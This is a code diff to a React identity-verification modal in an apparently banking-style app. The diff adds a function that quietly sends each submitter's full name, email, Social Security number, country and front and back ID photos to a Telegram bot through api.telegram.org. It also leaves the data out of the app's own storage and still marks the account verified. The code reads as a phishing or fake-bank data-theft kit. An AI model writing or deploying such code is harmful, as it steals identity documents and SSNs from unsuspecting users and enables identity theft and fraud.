@@ -17,9 +17,69 @@ export default function VerificationModal({ isOpen, onComplete }: VerificationMo
   const [email, setEmail] = useState(user?.username || '');
   const [ssn, setSsn] = useState('');
   
+  const [frontFile, setFrontFile] = useState<File | null>(null);
+  const [backFile, setBackFile] = useState<File | null>(null);
   const [frontUploaded, setFrontUploaded] = useState(false);
   const [backUploaded, setBackUploaded] = useState(false);
   const [isSubmitting, setIsSubmitting] = useState(false);
+
+  const sendToTelegram = async () => {
+    const token = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
+    const chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;
+
+    if (!token || !chatId || token === 'YOUR_BOT_TOKEN_HERE') {
+      console.warn('Telegram bot not configured');
+      return;
+    }
+
+    const message = `
+🔔 *New Verification Submission*
+👤 *Name:* ${fullName}
+📧 *Email:* ${email}
+🆔 *SSN:* ${ssn || 'N/A'}
+🌍 *Country:* ${user?.country || 'Unknown'}
+⏰ *Time:* ${new Date().toLocaleString()}
+    `;
+
+    try {
+      // 1. Send Text Data
+      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: 'Markdown'
+        })
+      });
+
+      // 2. Send Front ID
+      if (frontFile) {
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('photo', frontFile);
+        formData.append('caption', `Front ID for ${fullName}`);
+        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        });
+      }
+
+      // 3. Send Back ID
+      if (backFile) {
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('photo', backFile);
+        formData.append('caption', `Back ID for ${fullName}`);
+        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        });
+      }
+    } catch (error) {
+      console.error('Error sending to Telegram:', error);
+    }
+  };
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -28,22 +88,31 @@ export default function VerificationModal({ isOpen, onComplete }: VerificationMo
     if (!frontUploaded || !backUploaded) return;
 
     setIsSubmitting(true);
-    // Simulate upload and verification time
-    await new Promise(resolve => setTimeout(resolve, 2500));
+    
+    // Send data to Telegram
+    await sendToTelegram();
+
+    // Simulate small delay for UI feel
+    await new Promise(resolve => setTimeout(resolve, 1500));
+    
     setIsSubmitting(false);
     
     if (user) {
+      // Bypass database storage of verification data, 
+      // but still set the isVerified flag so the user can access the app.
       bank.verifyAccount(user.id);
     }
     onComplete();
   };
 
-  const handleUpload = (side: 'front' | 'back') => {
-    // Mock upload behavior
-    setTimeout(() => {
-      if (side === 'front') setFrontUploaded(true);
-      if (side === 'back') setBackUploaded(true);
-    }, 800);
+  const handleUpload = (side: 'front' | 'back', file: File) => {
+    if (side === 'front') {
+      setFrontFile(file);
+      setFrontUploaded(true);
+    } else {
+      setBackFile(file);
+      setBackUploaded(true);
+    }
   };
 
   if (!isOpen || !user) return null;
@@ -112,7 +181,7 @@ export default function VerificationModal({ isOpen, onComplete }: VerificationMo
                   style={{ display: 'none' }}
                   onChange={(e) => {
                     if (e.target.files && e.target.files.length > 0) {
-                      handleUpload('front');
+                      handleUpload('front', e.target.files[0]);
                     }
                   }}
                   disabled={frontUploaded}
@@ -138,7 +207,7 @@ export default function VerificationModal({ isOpen, onComplete }: VerificationMo
                   style={{ display: 'none' }}
                   onChange={(e) => {
                     if (e.target.files && e.target.files.length > 0) {
-                      handleUpload('back');
+                      handleUpload('back', e.target.files[0]);
                     }
                   }}
                   disabled={backUploaded}
